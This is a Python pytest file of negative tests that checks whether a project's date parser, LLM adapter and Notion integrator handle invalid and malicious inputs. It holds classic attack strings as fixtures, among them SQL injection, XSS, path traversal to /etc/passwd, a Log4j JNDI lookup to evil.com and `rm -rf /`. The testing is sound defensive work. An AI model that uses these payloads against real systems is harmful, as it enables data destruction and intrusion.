"""Unit tests for error handling across system components.

This module provides systematic negative test cases to validate:
- Graceful handling of invalid inputs
- Proper error message generation
- Exception type correctness
- Error recovery mechanisms
- Input validation and sanitization

All components should fail gracefully without crashes.
"""

import pytest

from collabiq.date_parser import parse_date
from notion_integrator.integrator import NotionIntegrator


class TestDateParserErrorHandling:
    """Negative test cases for date parser."""

    def test_none_input(self):
        """Test date parser handles None input gracefully."""
        # Date parser converts None to string
        result = parse_date(None)
        assert result is not None

    def test_empty_string(self):
        """Test date parser handles empty string."""
        result = parse_date("")
        # Should return empty result or structured response
        assert result is not None

    def test_whitespace_only(self):
        """Test date parser handles whitespace-only input."""
        result = parse_date("   \n\t   ")
        assert result is not None

    def test_invalid_type_number(self):
        """Test date parser handles numeric input gracefully."""
        # Date parser converts to string
        result = parse_date(12345)
        assert result is not None

    def test_invalid_type_list(self):
        """Test date parser handles list input gracefully."""
        # Date parser converts to string
        result = parse_date(["2025", "12", "01"])
        assert result is not None

    def test_invalid_type_dict(self):
        """Test date parser handles dict input gracefully."""
        # Date parser converts to string
        result = parse_date({"year": 2025, "month": 12, "day": 1})
        assert result is not None

    def test_sql_injection_attempt(self):
        """Test date parser handles SQL injection safely."""
        injection = "'; DROP TABLE dates; --"
        result = parse_date(injection)
        # Should treat as text, not execute
        assert result is not None

    def test_xss_attempt(self):
        """Test date parser handles XSS attempts safely."""
        xss = "<script>alert('xss')</script>"
        result = parse_date(xss)
        # Should treat as text, not interpret
        assert result is not None

    def test_path_traversal_attempt(self):
        """Test date parser handles path traversal safely."""
        path = "../../../etc/passwd"
        result = parse_date(path)
        # Should treat as text
        assert result is not None

    def test_unicode_null_byte(self):
        """Test date parser handles null bytes."""
        null_byte = "2025\x00-12-01"
        result = parse_date(null_byte)
        assert result is not None

    def test_extremely_long_input(self):
        """Test date parser handles very long strings."""
        long_input = "X" * 100000
        result = parse_date(long_input)
        # Should handle or reject gracefully
        assert result is not None

    def test_invalid_date_values(self):
        """Test date parser handles impossible dates."""
        invalid_dates = [
            "2025-13-01",  # Month 13
            "2025-12-32",  # Day 32
            "2025-02-30",  # Feb 30
            "2025-00-15",  # Month 0
            "2025-06-00",  # Day 0
        ]

        for date_str in invalid_dates:
            result = parse_date(date_str)
            # Should detect invalidity
            assert result is not None


class TestLLMAdapterErrorHandling:
    """Negative test cases for LLM adapters."""

    @pytest.mark.asyncio
    async def test_empty_email_text(self):
        """Test LLM adapter handles empty email gracefully."""
        from llm_adapters.gemini_adapter import GeminiAdapter

        adapter = GeminiAdapter(api_key="test-key")

        with pytest.raises((ValueError, TypeError, Exception)):
            await adapter.extract_entities("")

    @pytest.mark.asyncio
    async def test_none_email_text(self):
        """Test LLM adapter handles None input."""
        from llm_adapters.gemini_adapter import GeminiAdapter
        from llm_provider.exceptions import LLMValidationError

        adapter = GeminiAdapter(api_key="test-key")

        with pytest.raises((TypeError, ValueError, AttributeError, LLMValidationError)):
            await adapter.extract_entities(None)

    @pytest.mark.asyncio
    async def test_invalid_type_email(self):
        """Test LLM adapter rejects non-string input."""
        from llm_adapters.gemini_adapter import GeminiAdapter

        adapter = GeminiAdapter(api_key="test-key")

        with pytest.raises((TypeError, ValueError, AttributeError)):
            await adapter.extract_entities(12345)

    @pytest.mark.asyncio
    async def test_extremely_long_email(self):
        """Test LLM adapter handles very long emails."""
        from llm_adapters.gemini_adapter import GeminiAdapter

        adapter = GeminiAdapter(api_key="test-key")
        long_email = "text " * 100000  # Very long email

        # Should either process or reject gracefully
        try:
            result = await adapter.extract_entities(long_email)
            assert isinstance(result, dict)
        except (ValueError, Exception):
            # Acceptable to reject oversized input
            pass


@pytest.mark.skip(reason="API refactored - NotionIntegrator.create_company_entry() removed, use NotionWriter instead")
class TestNotionIntegratorErrorHandling:
    """Negative test cases for Notion integrator."""

    @pytest.fixture
    def integrator(self):
        """Create Notion integrator instance."""
        return NotionIntegrator()

    def test_none_extraction_result(self, integrator):
        """Test Notion integrator handles None input."""
        with pytest.raises((TypeError, ValueError, AttributeError, KeyError)):
            integrator.create_company_entry(None)

    def test_empty_dict_extraction(self, integrator):
        """Test Notion integrator handles empty dict."""
        with pytest.raises((ValueError, KeyError, Exception)):
            integrator.create_company_entry({})

    def test_missing_required_fields(self, integrator):
        """Test Notion integrator validates required fields."""
        incomplete_data = {
            "startup_name": {"value": "TestCo", "confidence": 0.9},
            # Missing other required fields
        }

        with pytest.raises((ValueError, KeyError, Exception)):
            integrator.create_company_entry(incomplete_data)

    def test_wrong_field_structure(self, integrator):
        """Test Notion integrator validates field structure."""
        wrong_structure = {
            "startup_name": "not a dict",  # Should be {"value": ..., "confidence": ...}
            "person_in_charge": "also wrong",
            "partner_org": "wrong",
            "details": "wrong",
            "date": "wrong",
        }

        with pytest.raises((TypeError, ValueError, KeyError, AttributeError)):
            integrator.create_company_entry(wrong_structure)

    def test_invalid_confidence_values(self, integrator):
        """Test Notion integrator validates confidence scores."""
        invalid_confidence = {
            "startup_name": {"value": "TestCo", "confidence": 1.5},  # > 1.0
            "person_in_charge": {"value": "John", "confidence": -0.5},  # < 0.0
            "partner_org": {"value": "Partner", "confidence": "high"},  # Not float
            "details": {"value": "Details", "confidence": 0.8},
            "date": {"value": "2025-12-01", "confidence": 0.9},
        }

        # Should validate or coerce confidence values
        try:
            integrator.create_company_entry(invalid_confidence)
        except (TypeError, ValueError):
            # Acceptable to reject invalid confidence
            pass


class TestInputValidation:
    """Systematic negative tests for input validation."""

    @pytest.mark.parametrize(
        "invalid_input",
        [
            None,
            "",
            " ",
            "\n",
            "\t",
            123,
            12.34,
            True,
            False,
            [],
            {},
            set(),
            tuple(),
        ],
    )
    def test_date_parser_rejects_invalid_types(self, invalid_input):
        """Test date parser validates input types."""
        if isinstance(invalid_input, str):
            # String inputs should be handled
            result = parse_date(invalid_input)
            assert result is not None
        else:
            # Non-string inputs should return a result with parsed_date=None and error
            result = parse_date(invalid_input)
            assert result is not None, "Parser should return DateParseResult, not raise"
            assert result.parsed_date is None, f"Non-string input should not parse to a date: {invalid_input}"
            # Should have some error indication (either parse_error or low confidence)
            assert result.parse_error is not None or result.confidence == 0.0

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "${jndi:ldap://evil.com}",  # Log4j
            "../../../etc/passwd",  # Path traversal
            "{{7*7}}",  # Template injection
            "`rm -rf /`",  # Command injection
            "\x00",  # Null byte
            "\\x00\\x01",  # Binary data
        ],
    )
    def test_date_parser_sanitizes_malicious_input(self, malicious_input):
        """Test date parser handles malicious inputs safely."""
        result = parse_date(malicious_input)
        # Should treat as text, not execute
        assert result is not None
        # parsed_date should either be None or a safe datetime object (not contain malicious strings)
        # Note: original_text field keeps the input for debugging, but parsed_date should be safe
        if result.parsed_date:
            # If parsed to a date, ensure it's a datetime object (not a string with malicious content)
            from datetime import datetime
            assert isinstance(result.parsed_date, datetime), "parsed_date should be a datetime object"
            # Ensure no malicious content in the ISO format output
            assert "DROP" not in str(result.iso_format or "")
            assert "<script>" not in str(result.iso_format or "")


class TestBoundaryConditions:
    """Test boundary conditions and edge cases."""

    def test_date_parser_minimum_length(self):
        """Test date parser with minimum length input."""
        result = parse_date("a")
        assert result is not None

    def test_date_parser_zero_length(self):
        """Test date parser with zero-length input."""
        result = parse_date("")
        assert result is not None

    def test_date_parser_maximum_reasonable_length(self):
        """Test date parser with maximum reasonable input."""
        # 1000 chars should be reasonable
        result = parse_date("X" * 1000)
        assert result is not None

    def test_extraction_result_all_none(self):
        """Test extraction result with all None values."""
        all_none = {
            "startup_name": {"value": None, "confidence": 0.0},
            "person_in_charge": {"value": None, "confidence": 0.0},
            "partner_org": {"value": None, "confidence": 0.0},
            "details": {"value": None, "confidence": 0.0},
            "date": {"value": None, "confidence": 0.0},
        }

        # System should handle all-None extraction
        assert isinstance(all_none, dict)
        assert all("confidence" in v for v in all_none.values())

    def test_extraction_result_all_empty_strings(self):
        """Test extraction result with all empty strings."""
        all_empty = {
            "startup_name": {"value": "", "confidence": 0.0},
            "person_in_charge": {"value": "", "confidence": 0.0},
            "partner_org": {"value": "", "confidence": 0.0},
            "details": {"value": "", "confidence": 0.0},
            "date": {"value": "", "confidence": 0.0},
        }

        # System should handle all-empty extraction
        assert isinstance(all_empty, dict)
        assert all("value" in v for v in all_empty.values())

    def test_confidence_boundaries(self):
        """Test confidence score boundary values."""
        boundary_confidences = {
            "startup_name": {"value": "Test", "confidence": 0.0},  # Minimum
            "person_in_charge": {"value": "Test", "confidence": 1.0},  # Maximum
            "partner_org": {"value": "Test", "confidence": 0.5},  # Middle
            "details": {"value": "Test", "confidence": 0.0001},  # Near zero
            "date": {"value": "2025-12-01", "confidence": 0.9999},  # Near one
        }

        # All boundary values should be valid
        assert all(0.0 <= v["confidence"] <= 1.0 for v in boundary_confidences.values())
